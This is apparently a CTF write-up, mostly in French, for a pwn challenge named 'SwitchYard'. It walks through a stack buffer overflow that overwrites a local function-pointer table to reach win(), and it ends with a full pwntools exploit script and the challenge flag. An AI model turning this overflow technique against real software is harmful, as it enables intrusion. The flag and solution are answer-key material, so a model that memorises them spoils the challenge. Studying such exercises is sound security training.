# Writeup — SwitchYard

**Category:** Pwn  
**Binary:** `switchyard` (ELF 64-bit, pas de canary, NX activé)  
**Flag:** `CCOI26{_sWiTcH_YaRD_PwN3d_g00d_J0b_}`

---

## Description

> Switch tracks to find the flag.

---

## Analyse du binaire

```
$ checksec switchyard
Arch:     amd64-64-little
RELRO:    Partial
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

Dans Ghidra, la fonction principale initialise un tableau de pointeurs de fonctions :

```c
void (*dispatch[4])(void) = { func0, func1, func2, func3 };

void run(int idx) {
    char buf[48];
    printf("Input: ");
    read(0, buf, 128);   // <-- BOF, overflow de 80 octets
    dispatch[idx]();
}
```

Le `read()` déborde la stack et peut écraser `dispatch[]` qui est en variable locale juste après `buf`.

---

## Plan d'attaque

Il n'y a pas de canary to worry about. Je veux écraser `dispatch[idx]` pour le faire pointer vers `win()`.

Offset calculé avec GDB : **56 octets** pour atteindre `dispatch[0]`.

```python
payload = b"A" * 56 + p64(win_addr)
```

Avec `idx=0` le programme appelle `dispatch[0]()` → `win()` → shell.

---

## Script

```python
from pwn import *

elf = ELF("./switchyard")
p   = process("./switchyard")

win = elf.symbols["win"]

p.recvuntil(b"Input: ")
payload = b"A" * 56 + p64(win)
p.send(payload)
p.interactive()
```

---

## Flag

```
CCOI26{_sWiTcH_YaRD_PwN3d_g00d_J0b_}
```
